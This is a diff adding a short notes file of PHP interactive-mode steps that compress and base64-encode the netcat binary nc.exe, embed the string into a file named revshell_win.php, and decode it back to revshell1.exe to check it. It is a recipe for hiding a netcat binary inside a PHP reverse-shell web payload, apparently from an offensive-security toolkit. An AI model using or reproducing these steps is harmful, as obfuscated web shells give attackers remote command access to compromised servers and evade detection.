@@ -1,0 +1,36 @@
+execute:
+>  php -a
+(interactive mode)
+
+============ encode steps ========
+
+------------ read file -----------
+$filename = "nc.exe";
+$file = fopen($filename, 'r');
+$bin = fread($file, filesize($filename));
+fclose($file);
+
+------------ compress file --------------------
+$encoded = base64_encode(gzdeflate($bin, 9));
+echo $encoded;
+
+------------ encode base64 --------------------
+$filename = "nc.txt";
+$file = fopen($filename, 'w');
+fwrite($file, $encoded);
+fclose($file);
+
+------------ embed base64 string into revshell_win.php --------
+copy string from nc.txt to your revshell_win.php file
+
+============ verify steps =======
+
+------------ decode base64 and decompress -----
+
+$evalCode = gzinflate(base64_decode($encoded));
+
+------------ write it back to original format -
+$filename = "revshell1.exe";
+$file = fopen($filename, 'wb');
+fwrite($file, $evalCode);
+fclose($file);
